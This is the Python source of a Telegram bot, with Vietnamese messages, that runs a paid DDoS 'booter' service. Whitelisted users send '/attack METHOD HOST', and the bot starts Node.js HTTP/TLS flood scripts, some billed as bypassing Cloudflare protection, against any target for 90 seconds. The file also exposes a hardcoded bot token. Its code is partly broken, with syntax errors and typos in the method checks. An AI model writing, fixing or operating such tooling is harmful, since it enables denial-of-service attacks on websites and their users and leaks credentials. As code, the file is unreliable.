import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading
import haibedz

bot_token = '6950919877:AAGxfqqnUZyUKyavq-iwuur08SBTBaQFapk'

bot = telebot.TeleBot(bot_token)

allowed_group_id = []

allowed_users = []
processes = []
ADMIN_ID = 6440254552
proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
    
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng : /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm {user_id}. Có Thể Sử Dụng Lệnh 30 Ngày.')

load_users_from_database()

@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
XEM LỆNH ĐI RỒI NHẬP 
               ︵
              /'_/) 
             /¯ ../ 
            /'..../ 
           /¯ ../ 
          /... ./
   ¸•´¯/´¯ /' ...'/´¯`•¸  
 /'.../... /.... /.... /¯\
('  (...´.(,.. ..(...../',    \
 \'.............. .......\'.    )      
   \'....................._.•´/
     \ ....................  /
       \ .................. |
         \  ............... |
           \............... |
             \ .............|
               \............|
                 \ .........|
                   \ .......|
                     \ .....|
                       \ ...|
                         \ .|
                           \\
                             \('-') 
                              |_|\
                              | |

✿ /attack   [ Methods + Target ]
✿ /methods [ Show Full List Methods 

'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
CHỈ TAY LÊN TRỜI HẬN ĐỜI VÔ ĐỐI                      
               ︵
              /'_/) 
             /¯ ../ 
            /'..../ 
           /¯ ../ 
          /... ./
   ¸•´¯/´¯ /' ...'/´¯`•¸  
 /'.../... /.... /.... /¯\
('  (...´.(,.. ..(...../',    \
 \'.............. .......\'.    )      
   \'....................._.•´/
     \ ....................  /
       \ .................. |
         \  ............... |
           \............... |
             \ .............|
               \............|
                 \ .........|
                   \ .......|
                     \ .....|
                       \ ...|
                         \ .|
                           \\
                             \('-') 
                              |_|\
                              | |
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
│             LAYER7?
│TLS tls high rqs
│TLS-1 bypass uam medium rqs
│RAW non bypass high rqs
│BYPASS bypass:)
│HYDRA high rqs medium bypass
│MIX bypass high rqs
│HTTPS https ddos:)
│DESTROY high rqs not destroy site:)

│ Methods List Layer 4 (update)
│ Auto update proxy (soon)


│How to use  /attack  Methods  Target 

'''
    bot.reply_to(message, help_text)
    


allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 15:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công. Cảm Ơn Bạn Đã Sử Dụng.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui Lòng Đợi {remaining_time} Giây Trước Khi Sử Dụng Lại Lệnh.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = ["chinhphu.vn"]   
    if method == 'TLS' or method == 'RAPID' or method == 'RAW'or method == 'BYPASS' or method == 'HYDRA' or method == 'MIX' or method == DESTROYor method == 'HTTPS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không Được Phép Tấn Công Trang Web Có Tên Miền {blocked_domain}")
                return

    if method in ['TLS-', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESROY']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "tls.js", host, "90", "64", "7", "live.txt"]
            duration = 90
        if method == 'HYDRA':
            command = ["node", "TLS-3.js", host, "90", "64", "7", "live.txt"]
            duration = 90
        if method == 'BYPASS':
            command = ["node", "bypass.js", host, "90", "64", "7", "live.txt"]
            duration = 90
        if method == 'RAW':
            command = ["node", "raw.js", host, "90", "64", "7", "live.txt"]
            duration = 90
        if method == 'RAPID':
            command = ["node", "rapid.js", host, "90", "64", "7", "live.txt"]
            duration = 90
        if method == 'MIX':
            command = ["node", "mix.js", host, "90", "64", "7", "live.txt"]
            duration = 90
        if method == 'HTTPS'
            command = ["node", "https.js", host, "90", "64", "7", "live.txt"]
            duration = 90
        if method == 'DESTROY'
            command = ["node", "destroy.js", host, "90", "64", "7", "live.txt"]
            duration = 90
        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'Attack By : @{username} \nHost : {host} \nMethods : {method} \nTime : {duration} Giây')
    else:
        bot.reply_to(message, 'Phương Thức Tấn Công Không Hợp Lệ.')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh Không Hợp Lệ. Vui Lòng Sử Dụng Lệnh /help Để Xem Danh Sách Lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
